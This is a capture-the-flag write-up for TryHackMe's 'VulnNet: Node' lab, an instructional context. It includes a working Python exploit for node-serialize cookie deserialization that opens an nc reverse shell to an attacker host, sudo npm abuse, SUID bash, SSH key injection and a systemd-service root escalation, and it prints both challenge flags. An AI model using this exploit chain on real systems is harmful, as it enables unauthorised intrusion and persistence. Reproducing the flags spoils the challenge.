# 🌐 VulnNet: Node

### TryHackMe Writeup

[![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme)](https://tryhackme.com)
[![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)](https://tryhackme.com)
[![Status](https://img.shields.io/badge/Status-Pwned-blueviolet?style=for-the-badge)](https://tryhackme.com)
[![Type](https://img.shields.io/badge/Type-Linux-informational?style=for-the-badge&logo=linux)](https://tryhackme.com)

---

## 📋 Overview

| Field | Details |
|---|---|
| **Target** | `node` (10.113.186.70) |
| **OS** | Ubuntu 20.04 |
| **Attack Surface** | node-serialize deserialization RCE via session cookie |
| **Privesc** | npm sudo → SUID bash → serv-manage; writable systemd service + timer → root |

VulnNet: Node exposes a Node.js Express app that deserializes a user-controlled session cookie without sanitisation using the vulnerable `node-serialize` package, enabling IIFE-based RCE. From there, `www` can run `npm` as `serv-manage` with no password — abused via a crafted `package.json` to spawn a shell, then SUID-bash to pivot laterally. `serv-manage` has write access to a systemd service file and can manage its timer as root, making privilege escalation a matter of overwriting `ExecStart` and waiting for the trigger.

---

## 🔍 Enumeration

### Port Scan

```bash
sudo nmap -sC -sV -v -p- node -oA tcpscan-node
sudo nmap -sU -v node -oA udpscan-node
```

```
22/tcp   open  ssh   OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
8080/tcp open  http  Node.js Express framework
|_http-title: VulnNet – Your reliable news source – Try Now!
```

### Web Enumeration

```bash
ffuf -u http://node:8080/FUZZ -w ./Web-Content/raft-medium-files.txt -ic
ffuf -u http://node:8080/FUZZ -w ./Web-Content/raft-medium-directories.txt -ic
```

File brute returned nothing. Directory brute found:

```
/login   [Status: 200]
/css     [Status: 301]
/img     [Status: 301]
```

The `/login` page exists but there's no obvious credential path. The real attack surface is the session cookie set on the root `/` endpoint.

---

## 💀 Initial Access — node-serialize Deserialization RCE

### Vulnerable Source Code

```javascript
// server.js
var serialize = require('node-serialize');

app.get('/', function(req, res) {
  if (req.cookies.session) {
    var str = new Buffer(req.cookies.session, 'base64').toString();
    var obj = serialize.unserialize(str);  // ← no validation whatsoever
    if (obj.username) {
      ...
    }
  } else {
    res.cookie('session', "eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ==", ...);
  }
});
```

The default cookie decodes to `{"username":"Guest","isGuest":true,"encoding": "utf-8"}`. The app base64-decodes the cookie and passes it directly to `node-serialize`'s `unserialize()` — which evaluates Immediately Invoked Function Expressions (`_$$ND_FUNC$$_function(){...}()`) embedded in any field value. Classic deserialization sink.

### Proof-of-Concept (Ping-back)

To confirm RCE before weaponising:

```json
{
  "username": "Guest",
  "isGuest": false,
  "encoding": "utf-8",
  "rce": "_$$ND_FUNC$$_function(){require('child_process').exec('bash -c \"ping -c1 192.168.204.251\"')}()"
}
```

Base64-encode and set as the `session` cookie, then:

```bash
sudo tcpdump -i tun0 icmp
```

```
12:27:09.137465 IP node > 192.168.204.251: ICMP echo request, id 1, seq 1, length 64
12:27:09.137480 IP 192.168.204.251 > node: ICMP echo reply, id 1, seq 1, length 64
```

Execution confirmed.

### Reverse Shell

Built a Python exploit to automate payload generation:

```python
#!/usr/bin/env python3
"""
VulnNet-Node — node-serialize RCE exploit
Reverse shell only
"""

import argparse
import base64
import json
import sys
import urllib.parse
import requests

def build_payload(cmd: str) -> str:
    cmd_escaped = cmd.replace("'", "\\'")
    iife = f"_$$ND_FUNC$$_function(){{require('child_process').exec('{cmd_escaped}')}}()"
    obj = {
        "username": "Guest",
        "isGuest": False,
        "encoding": "utf-8",
        "rce": iife,
    }
    raw = json.dumps(obj)
    b64 = base64.b64encode(raw.encode()).decode()
    return urllib.parse.quote(b64)

def send(target: str, cookie: str) -> requests.Response:
    url = target.rstrip('/')
    headers = {"Cookie": f"session={cookie}"}
    return requests.get(url, headers=headers, timeout=10)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("target")
    parser.add_argument("lhost")
    parser.add_argument("lport")
    args = parser.parse_args()

    cmd = f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {args.lhost} {args.lport} >/tmp/f'
    cookie = build_payload(cmd)
    try:
        send(args.target, cookie)
    except requests.exceptions.ConnectionError:
        pass

if __name__ == "__main__":
    main()
```

```bash
# listener
nc -nlvp 4444

# trigger
python3 exploit.py 'http://node:8080' 192.168.204.251 4444
```

```
connect to [192.168.204.251] from (UNKNOWN) [10.113.186.70] 57318
sh: 0: can't access tty; job control turned off
$ whoami
www
```

Shell caught as `www`.

---

## 🔁 Privilege Escalation — www → serv-manage

### sudo Audit

```bash
sudo -l
```

```
User www may run the following commands on ip-10-113-186-70:
    (serv-manage) NOPASSWD: /usr/bin/npm
```

`www` can run `npm` as `serv-manage` with no password. `npm run` executes scripts defined in a `package.json` in the working directory. By dropping a crafted `package.json` into `/tmp` and using `--prefix /tmp`, we control what gets executed under `serv-manage`'s context.

### npm run → Shell

```bash
echo '{"scripts":{"shell":"sh"}}' > /tmp/package.json
sudo -u serv-manage /usr/bin/npm run shell --prefix /tmp
```

```
> @ shell /tmp
> sh

$ whoami
serv-manage
```

### SUID Bash

From the `serv-manage` shell, copy bash and set the SUID bit:

```bash
cp /bin/bash /tmp/bash
chmod +s /tmp/bash
exit
```

Back as `www`:

```bash
/tmp/bash -p
```

```
bash-5.0$ id
uid=1001(www) gid=1001(www) euid=1000(serv-manage) egid=1000(serv-manage) groups=1000(serv-manage),1001(www)
```

### SSH Persistence

Dropped a public key into `serv-manage`'s `authorized_keys` for a stable shell:

```bash
mkdir -p /home/serv-manage/.ssh
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB4/IKGHbOLHIYvUV3vkQm8jWQ5dW3XFf9CuoW4zYqqE evdaez@attack' >> /home/serv-manage/.ssh/authorized_keys
chmod 700 /home/serv-manage/.ssh
chmod 600 /home/serv-manage/.ssh/authorized_keys
```

```bash
ssh -i /tmp/serv serv-manage@node
```

### User Flag

```bash
cat /home/serv-manage/user.txt
```

```
THM{064640a2f880ce9ed7a54886f1bde821}
```

---

## 🔁 Privilege Escalation — serv-manage → root

### sudo Audit

```bash
sudo -l
```

```
User serv-manage may run the following commands on ip-10-113-186-70:
    (root) NOPASSWD: /bin/systemctl start vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl stop vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl daemon-reload
```

### Writable Systemd Units

```bash
find /etc/systemd/system/ -writable 2>/dev/null
```

```
/etc/systemd/system/vulnnet-job.service
/etc/systemd/system/vulnnet-auto.timer
```

`serv-manage` can write to both the service and its timer, and can reload + start it as root. The service runs as root — overwriting `ExecStart` makes it execute anything with root privileges on the next timer trigger.

### Modify the Service

Edit `ExecStart` to SUID `/bin/bash`:

```ini
[Unit]
Description=VulnNet Job

[Service]
Type=oneshot
ExecStart=/bin/chmod +s /bin/bash

[Install]
WantedBy=multi-user.target
```

### Trigger and Wait

```bash
sudo /bin/systemctl daemon-reload
sudo /bin/systemctl start vulnnet-auto.timer
watch -n 1 ls -lah /bin/bash
```

Once the timer fires:

```
-rwsr-sr-x 1 root root 1.2M Apr 18 2022 /bin/bash
```

### Root Shell

```bash
/bin/bash -p
```

```
bash-5.0# whoami
root
```

### Root Flag

```bash
cat /root/root.txt
```

```
THM{abea728f211b105a608a720a37adabf9}
```

---

## 🗺️ Attack Chain

```
[Nmap]
    8080/tcp → Node.js Express (VulnNet news app)
          │
          ▼
[Session Cookie Analysis]
    base64-decoded JSON → node-serialize.unserialize() — no validation
    craft IIFE payload → _$$ND_FUNC$$_ field → RCE confirmed via pingback
          │
          ▼
[node-serialize Deserialization RCE]
    mkfifo reverse shell in cookie → GET / → shell as www
          │
          ▼
[sudo npm Abuse]
    www: (serv-manage) NOPASSWD: /usr/bin/npm
    drop package.json {"scripts":{"shell":"sh"}} → npm run shell --prefix /tmp
    → shell as serv-manage → cp /bin/bash /tmp + chmod +s → bash -p
          │
          ▼
[SSH Key Injection]
    write pubkey to /home/serv-manage/.ssh/authorized_keys → stable SSH session
    sudo -l → systemctl start/stop/daemon-reload for vulnnet-auto.timer
          │
          ▼
[Writable Systemd Service]
    /etc/systemd/system/vulnnet-job.service → writable by serv-manage
    overwrite ExecStart → chmod +s /bin/bash
    daemon-reload → start timer → wait for trigger → /bin/bash -p → root
```

---

## 📌 Key Takeaways

- `node-serialize`'s `unserialize()` evaluates IIFEs embedded in object values — never deserialise user-controlled data without validation, and audit any use of this package specifically
- Granting `sudo` on package managers (`npm`, `pip`, `gem`) is equivalent to a shell as the target user — always check `npm run` / `--prefix` vectors
- SUID bash from an elevated context is a reliable lateral movement primitive when you can't directly spawn a persistent shell
- Writable systemd unit files are a root escalation path as long as the attacker can trigger a reload and start — `daemon-reload` + `start` rights complete the chain
- Always enumerate `/etc/systemd/system/` for write permissions after gaining any foothold

---

## 🎯 MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Initial Access | Exploit Public-Facing Application | [T1190](https://attack.mitre.org/techniques/T1190) |
| Execution | Command and Scripting Interpreter: JavaScript | [T1059.007](https://attack.mitre.org/techniques/T1059/007) |
| Privilege Escalation | Abuse Elevation Control Mechanism: Sudo and Sudo Caching | [T1548.003](https://attack.mitre.org/techniques/T1548/003) |
| Privilege Escalation | Scheduled Task/Job: Systemd Timers | [T1053.006](https://attack.mitre.org/techniques/T1053/006) |

---

## 🛠️ Tools Used

| Tool | Purpose |
| --- | --- |
| `nmap` | Port and service enumeration |
| `ffuf` | Directory and login endpoint discovery |
| Python exploit | node-serialize deserialization RCE via IIFE in session cookie |
| `nc` | Reverse shell listener |
| `npm` | Abused via sudo to spawn shell as serv-manage |
| `ssh` | Persistent access via injected public key |
| `systemctl` | Reload and start modified vulnnet-auto.timer for root escalation |

## 🚩 Flags

<details>
<summary><code>user.txt</code></summary>

`THM{064640a2f880ce9ed7a54886f1bde821}`

</details>

<details>
<summary><code>root.txt</code></summary>

`THM{abea728f211b105a608a720a37adabf9}`

</details>
